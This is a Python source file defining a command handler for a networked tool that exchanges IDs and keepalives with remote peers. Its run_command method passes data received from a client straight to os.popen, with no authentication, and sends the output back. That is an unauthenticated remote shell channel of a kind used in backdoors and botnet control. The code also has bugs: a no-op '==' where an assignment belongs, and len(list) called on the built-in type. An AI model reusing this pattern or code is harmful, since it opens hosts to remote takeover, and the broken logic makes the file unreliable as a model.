#!/usr/bin/env python

from os import popen
import sys
from time import time
import types

class pStdCmdHandler:
    cmds = {}

    def __init__(s, srv):
        s.server = srv
        s.cmds[0] = s.send_ka
        s.cmds[1] = s.send_id
        s.cmds[2] = s.run_command

        s.cmds[128+0] = s.receive_ka
        s.cmds[128+1] = s.receive_id
        s.cmds[128+2] = s.print_command_output
    
    def send_ka(s, client, data):
        return s.server.myid

    def send_id(s, client, data):
        return s.server.myid

    def run_command(s, client, data):
        for i in popen(data).readlines():
            yield i
            

    def receive_ka(s, client, data):
        client['last_ka'] = time()
        if client['id'] == '':
            client['id'] = data.strip().rstrip()

        return ''

    def receive_id(s, client, data):
        cid = data.strip().rstrip()
        client['id'] == cid
        return ''

    def print_command_output(s, client, data):
        sys.stdout.write("[" + client['id'] + "] => " + str(data))
        return ''

    def run(s, client, cmdid, data):
    
        cmd = s.cmds[cmdid]
        rcmdid = 128+cmdid if cmdid < 128 else cmdid

        ret = cmd(client, data)

        if isinstance(ret, types.GeneratorType):
            for l in ret:
                s.server.logger("Cmd id returned: " + str(rcmdid) +" " + str(len(l)) + " " + str(l))
                if isinstance(l, list):
                    for m in l:
                        if m > '': s.server.send_packet_data(client['address'], client['port'], rcmdid, m)
                elif isinstance(l, str):
                    if l > '': s.server.send_packet_data(client['address'], client['port'], rcmdid, l)
        elif isinstance(ret, str) and ret > '':
            s.server.send_packet_data(client['address'], client['port'], rcmdid, ret)
        elif isinstance(ret, list) and len(list)>0:
            for l in ret:
                s.server.send_packet_data(client['address'], client['port'], rcmdid, l)

